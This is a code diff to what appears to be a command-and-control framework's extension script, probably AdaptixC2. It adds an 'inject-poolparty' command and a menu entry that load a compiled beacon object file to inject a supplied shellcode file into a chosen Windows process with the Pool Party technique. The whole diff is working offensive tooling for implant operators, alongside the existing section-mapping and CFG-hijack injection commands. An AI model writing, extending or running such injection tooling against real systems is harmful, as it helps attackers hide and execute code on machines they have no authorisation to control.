@@ -33,7 +33,24 @@ cmd_inject_sec.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
     ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, message);
 });
 
-var group_exec = ax.create_commands_group("Injection-BOF", [cmd_inject_cfg, cmd_inject_sec]);
+var cmd_inject_poolparty = ax.create_command("inject-poolparty", "Injects desired shellcode into target process using specified pool party technique", "inject-poolparty 999 /tmp/shellcode.bin 7");
+cmd_inject_poolparty.addArgInt("pid", true)
+cmd_inject_poolparty.addArgFile("shellcode", true);
+cmd_inject_poolparty.addArgInt("technique", false);
+
+cmd_inject_poolparty.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
+    let pid = parsed_json["pid"];
+    let shellcode_content = parsed_json["shellcode"];
+    let technique = parsed_json["technique"];
+
+    let bof_params = ax.bof_pack("int,bytes,int", [pid, shellcode_content, technique]);
+    let bof_path = ax.script_dir() + "_bin/inject_poolparty." + ax.arch(id) + ".o";
+    let message = "Task: inject shellcode (pool party " + "technique " + technique +")";
+
+    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, message);
+});
+
+var group_exec = ax.create_commands_group("Injection-BOF", [cmd_inject_cfg, cmd_inject_sec, cmd_inject_poolparty]);
 ax.register_commands_group(group_exec, ["beacon", "gopher"], ["windows"], []);
 
 /// MENU
@@ -41,7 +58,8 @@ ax.register_commands_group(group_exec, ["beacon", "gopher"], ["windows"], []);
 let inject_action = menu.create_action("Inject shellcode", function(process_list) {
     let methods = {
         "inject-sec": "Injects desired shellcode into target process using section mapping",
-        "inject-cfg": "Inject shellcode into a target process and hijack execution via overwriting combase.dll!__guard_check_icall_fptr"
+        "inject-cfg": "Inject shellcode into a target process and hijack execution via overwriting combase.dll!__guard_check_icall_fptr",
+        "inject-poolparty": "Injects desired shellcode into target process using pool party"
     };
     let label_shellcode  = form.create_label("Shellcode file:");
     let text_shellcode   = form.create_textline();
@@ -49,7 +67,7 @@ let inject_action = menu.create_action("Inject shellcode", function(process_list
 
     let label_method = form.create_label("Inject method:");
     let combo_method = form.create_combo();
-    combo_method.addItems(["inject-sec", "inject-cfg"]);
+    combo_method.addItems(["inject-sec", "inject-cfg", "inject-poolparty"]);
 
     let text_description = form.create_textmulti( methods["inject-sec"] );
     text_description.setReadOnly(true);
